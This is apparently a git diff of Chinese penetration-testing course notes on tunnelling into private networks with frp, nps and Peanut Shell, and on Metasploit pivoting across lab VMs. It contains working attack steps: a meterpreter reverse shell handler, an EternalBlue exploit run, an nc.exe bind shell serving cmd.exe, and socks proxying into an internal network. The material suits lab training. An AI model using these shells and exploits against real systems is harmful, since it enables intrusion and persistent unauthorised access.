@@ -1,8 +1,10 @@
-外网访问内网服务：
+
+
+# 第一天：外网访问内网服务
 
 
 
-方法一：首先有公网ip
+## 方法一：首先有公网ip
 
 查看路由器WANIP是否与地址https://www.ip138.com/查询的公网ip是否一致,如果一致则有，否则，打电话给运营商，申请公网ip
 
@@ -14,7 +16,7 @@
 
 
 
-方法二：无公网ip利用花生壳
+## 方法二：无公网ip利用花生壳
 
 
 
@@ -89,7 +91,7 @@ kali开启apache2服务
 
 
 
-方法三：使用frp搭建内网穿透服务器
+## 方法三：使用frp搭建内网穿透服务器
 
 ![image-20211012154458936](assets/image-20211012154458936.png)
 
@@ -346,9 +348,11 @@ custom_domains = cloud.guoguogewangzi.com
 
 
 
+# 第二天
+
 ![image-20211012173659987](assets/image-20211012173659987.png)
 
-
+## 2.1 实战-利用frp，接收来自公网的shell
 
 
 
@@ -454,7 +458,7 @@ msf6 exploit(multi/handler) > run
 
 
 
-
+## 2.2 使用MSF自带代理功能实现内网渗透
 
 ![image-20211012190943037](assets/image-20211012190943037.png)
 
@@ -494,11 +498,17 @@ Window7网卡设置：
 
 
 
-
-
 首先拿到Centos:192.168.111.138系统权限
 
+```
+chmod +x xuegod
+
+./xuegod
+```
+
 ![image-20211012193900565](assets/image-20211012193900565.png)
+
+拿到Centos:192.168.111.138系统权限
 
 ![image-20211012194036101](assets/image-20211012194036101.png)
 
@@ -521,9 +531,9 @@ Window7网卡设置：
 建立路由，`route add 192.168.201.0 255.255.255.0 2`,会话id:2
 
 ```shell
-meterpreter > background
+meterpreter > background              #保存会话
 [*] Backgrounding session 2...
-msf6 exploit(multi/handler) > sessions
+msf6 exploit(multi/handler) > sessions        #查看会话id
 
 Active sessions
 ===============
@@ -532,7 +542,7 @@ Active sessions
   --  ----  ----                   -----------                                                                       ----------
   2         meterpreter x64/linux  root @ localhost.localdomain (uid=0, gid=0, euid=0, egid=0) @ localhost.local...  192.168.111.132:4444 -> 192.168.111.132:52278 (::1)
 
-msf6 exploit(multi/handler) > route add 192.168.201.0 255.255.255.0 2
+msf6 exploit(multi/handler) > route add 192.168.201.0 255.255.255.0 2  #为192.168.201.0网段添加路由
 [*] Route added
 msf6 exploit(multi/handler) >
 
@@ -674,9 +684,9 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) > run
 
 
 
+## 2.3 通过frp内网穿透来实现内网穿透
+
 ![image-20211012220153531](assets/image-20211012220153531.png)
-
-
 
 
 
@@ -955,9 +965,11 @@ rdp客户端连接
 
 
 
+# 第三天
+
 ![image-20211013174252565](assets/image-20211013174252565.png)
 
-
+## 3.1 实战：内网穿透-二级代理
 
 ![image-20211013200754533](assets/image-20211013200754533.png)
 
@@ -1156,7 +1168,6 @@ Win7-2:192.168.201.131
         <td>192.168.201.131</td> 
         <td>仅主机模式</td> 
     </tr>
-
 </table>
 
 
@@ -1368,9 +1379,61 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) > run
 
 
 
-三级代理：
+## 3.2 实战：内网穿透-三级代理
 
 ![image-20211015121416219](assets/image-20211015121416219.png)
+
+
+
+网络环境：
+
+<table>
+    <tr>
+        <td>主机</td> 
+        <td>IP</td> 
+        <td>网卡</td> 
+   	</tr>
+    <tr>
+        <td>Kali</td> 
+        <td>172.31.50.223</td> 
+        <td>桥接模式</td> 
+    </tr>
+       <tr>
+        <td>vps</td> 
+        <td>175.24.115.4</td> 
+        <td>公网服务器</td> 
+    </tr>
+    <tr>
+        <td rowspan="2">Centos</td>    
+        <td >172.31.50.224</td>
+        <td>桥接模式</td> 
+    </tr>
+    <tr>
+        <td >192.168.111.142</td>
+        <td>NAT模式</td> 
+    </tr>
+        <tr>
+        <td rowspan="2">Win7-1</td>    
+        <td >192.168.111.131</td>
+        <td>NAT模式</td> 
+    </tr>
+    <tr>
+        <td >192.168.201.130</td>
+        <td>仅主机模式</td> 
+    </tr>
+    <tr>
+        <td rowspan="2"> Win7-2</td> 
+        <td>192.168.201.131</td> 
+        <td>仅主机模式</td> 
+    </tr>
+        <tr>
+        <td >192.168.77.128(新增)</td>
+        <td>仅主机模式</td> 
+    </tr>
+        <tr>
+        <td > Win7-3(新增)</td> 
+        <td>192.168.77.129</td> 
+        <td>仅主机模式</td> 
 
 
 
@@ -1534,6 +1597,8 @@ nc.exe -Ldp 443 -e cmd.exe
 
 
 
+# 实战-nps内网穿透
+
 ![image-20211015150015675](assets/image-20211015150015675.png)
 
 
@@ -1560,11 +1625,9 @@ github下载地址：https://github.com/ehang-io/nps/releases
 
 
 
+## 下载nps：
+
 ![image-20211015151053014](assets/image-20211015151053014.png)
-
-
-
-
 
 
 
@@ -1584,6 +1647,8 @@ drwxr-xr-x. 4 root root         33 10月 15 15:29 web
 ```
 
 
+
+## 启动nps服务端
 
 需要修改配置文件conf/nps.conf
 
@@ -1624,10 +1689,6 @@ web_ip=0.0.0.0         #谁都可以连
 
 
 
-
-
-
-
 也可以通过服务的方式启动：
 
 ```
@@ -1650,7 +1711,11 @@ web_ip=0.0.0.0         #谁都可以连
 
 ![image-20211015155050762](assets/image-20211015155050762.png)
 
-在web上添加客户端配置（也可在客户端中conf下配置，会自动在web上添加配置）：本次直接在web上添加配置：
+
+
+## 启动客户端
+
+在web上添加客户端配置（也可在客户端中conf下配置，然后会自动在web上添加配置）：本次直接在web上添加配置：
 
 ![image-20211015161007841](assets/image-20211015161007841.png)
 
@@ -1658,7 +1723,7 @@ web_ip=0.0.0.0         #谁都可以连
 
 
 
-上传inux_amd64_client.tar.gz客户端到kali并解压，修改配置文件并启动
+Kali:上传inux_amd64_client.tar.gz客户端并解压，修改配置文件并启动
 
 ```shell
 ┌──(kali㉿kali)-[~]
@@ -1674,11 +1739,11 @@ conf/multi_account.conf
 drwxr-xr-x 2 kali kali     4096 10月 15 04:00 conf
 -rwxr-xr-x 1 kali kali 12013568  4月  8  2021 npc
 ┌──(kali㉿kali)-[~/npc]
-└─$ vi conf/npc.conf
+└─$ vi conf/npc.conf                       #修改配置文件
 
 改为:
 [common]
-server_addr=175.24.115.4:8024
+server_addr=175.24.115.4:8024              #修改为服务器ip
 
 安装启动：
 ┌──(kali㉿kali)-[~/npc]
@@ -1699,7 +1764,7 @@ server_addr=175.24.115.4:8024
 
 
 
-成功在线：
+## 成功在线：
 
 ![image-20211015164045349](assets/image-20211015164045349.png)
 
@@ -1707,7 +1772,7 @@ server_addr=175.24.115.4:8024
 
 
 
-添加隧道：
+## 添加隧道：TCP(22)
 
 ![image-20211015161433629](assets/image-20211015161433629.png)
 
@@ -1723,6 +1788,8 @@ ssh root@175.24.115.4 -p 8001
 
 
 
+## 添加隧道：TCP(3389)
+
 ![image-20211015165950921](assets/image-20211015165950921.png)
 
 
@@ -1737,6 +1804,53 @@ ssh root@175.24.115.4 -p 8001
 
 
 
+成功远程桌面到内网ip:172.31.50.102
+
+```
+
+┌──(kali㉿kali)-[~]
+└─$ rdesktop -g 1440x900 -u admin -p 123 175.24.115.4:8002
+
+ATTENTION! The server uses and invalid security certificate which can not be trusted for
+the following identified reasons(s);
+
+ 1. Certificate issuer is not trusted by this system.
+
+     Issuer: CN=admin-PC
+
+
+Review the following certificate info before you trust it to be added as an exception.
+If you do not trust the certificate the connection atempt will be aborted:
+
+    Subject: CN=admin-PC
+     Issuer: CN=admin-PC
+ Valid From: Sun Aug 29 03:20:57 2021
+         To: Mon Feb 28 02:20:57 2022
+
+  Certificate fingerprints:
+
+       sha1: a367c1fc93012195b6176e926637a04382964fb0
+     sha256: e8c3a53ea7a40e515ce3abbb1c89c01252a9c609f6440deb95ea116f21bc6833
+
+
+Do you trust this certificate (yes/no)? yes
+
+```
+
+![image-20211015203148311](assets/image-20211015203148311.png)
+
+
+
+
+
+
+
+
+
+## 添加web服务:主机可以直接使用ip
+
+![image-20211015170116548](assets/image-20211015170116548.png)
+
 
 
 kali开启apache服务
@@ -1749,13 +1863,7 @@ kali开启apache服务
 
 
 
-添加web服务:主机可以直接使用ip
-
-![image-20211015170116548](assets/image-20211015170116548.png)
-
-
-
-成功访问：http://172.31.50.101/
+成功访问：http://172.31.50.101/，如果通过域名访问，确保/etc/hosts存在`172.31.50.101 cloud.guoguogewangzi.com`解析记录
 
 ![image-20211015171151046](assets/image-20211015171151046.png)
 
@@ -1763,7 +1871,7 @@ kali开启apache服务
 
 
 
-添加隧道：
+## 添加隧道：TCP(4444)
 
 ![image-20211015171521863](assets/image-20211015171521863.png)
 
@@ -1787,22 +1895,18 @@ Saved as: xuegod
 
 
 
-
-
-
-
 开始利用：
 
 ```shell
 ┌──(kali㉿kali)-[~/frp_0.37.1_linux_amd64]
-└─$ sudo msfdb run
-msf6 > use exploit/multi/handler
+└─$ sudo msfdb run                         #启动msfdb
+msf6 > use exploit/multi/handler             #使用监听模块
 [*] Using configured payload generic/shell_reverse_tcp
-msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp   #设置反弹shell的payload
 payload => linux/x64/meterpreter/reverse_tcp
-msf6 exploit(multi/handler) > set LHOST 172.31.50.101
+msf6 exploit(multi/handler) > set LHOST 172.31.50.101       #设置本机ip为监听ip
 LHOST => 172.31.50.101
-msf6 exploit(multi/handler) > show options
+msf6 exploit(multi/handler) > show options                     #查看详情
 
 Module options (exploit/multi/handler):
 
@@ -1842,9 +1946,7 @@ xuegod
 
 
 
-
-
-添加socks代理：
+## 添加socks代理：
 
 ![image-20211015173930214](assets/image-20211015173930214.png)
 
@@ -1857,6 +1959,22 @@ xuegod
 ![image-20211015174519483](assets/image-20211015174519483.png)
 
 
+
+修改/etc/proxychains4.conf
+
+```
+┌──(kali㉿kali)-[~]
+└─$ sudo vi /etc/proxychains4.conf
+
+添加以下一行
+socks5 175.24.115.4 8004
+```
+
+
+
+成功访问公司内网:
+
+![image-20211015212214487](assets/image-20211015212214487.png)
 
 
 
